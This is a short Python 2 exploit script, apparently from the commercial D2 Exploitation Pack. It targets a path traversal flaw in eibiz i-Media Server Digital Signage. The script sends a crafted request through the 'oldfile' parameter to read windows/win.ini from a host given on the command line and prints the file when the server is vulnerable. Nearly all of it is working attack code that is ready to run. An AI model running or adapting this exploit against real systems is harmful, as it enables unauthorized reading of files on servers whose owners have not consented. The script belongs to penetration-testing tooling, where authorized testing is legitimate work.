#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_eibiz_2'
_vendor_ = 'eibiz'
_model_  = ['i-Media Server Digital Signage']
_vuln_   = 'Path Traversal Vulnerability'
_cve_    = ''
_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5585.php'
_port_   = 80

def pwnrouter(host,port=_port_):
  try:
    url = "http://%s:%s/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null" % (host,port)
    response = requests.get(url, verify=False)
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if "[extensions]" in response.text:
    print '[+] %s vulnerable' % host
    print(response.text)
  else:
    print '[+] %s not vulnerable' % host


if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
